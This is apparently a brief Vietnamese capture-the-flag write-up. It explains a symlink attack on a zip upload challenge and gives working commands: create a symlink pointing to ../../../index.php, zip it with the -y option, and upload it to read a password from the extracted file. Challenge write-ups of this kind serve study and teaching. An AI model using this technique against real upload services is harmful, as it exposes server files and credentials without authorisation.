Để làm được chall này phải biết 1 kiến thức rất quan trọng, đó là [symlink](https://tsublogs.wordpress.com/2017/04/05/pentest-qa-cung-tsu-2-symlink-attack/)

Để tóm gọn lại, `symlink` là `shortcut` bên Linux.

Quá trình tấn công chall này như sau:

- Tạo 1 file symlink:

  `ln -s ../../../index.php harm.txt`

- Nén thành file zip:

  `zip -y harm.zip harm.txt`

- Nộp lên server và sẽ lấy được password trong file giải nén ra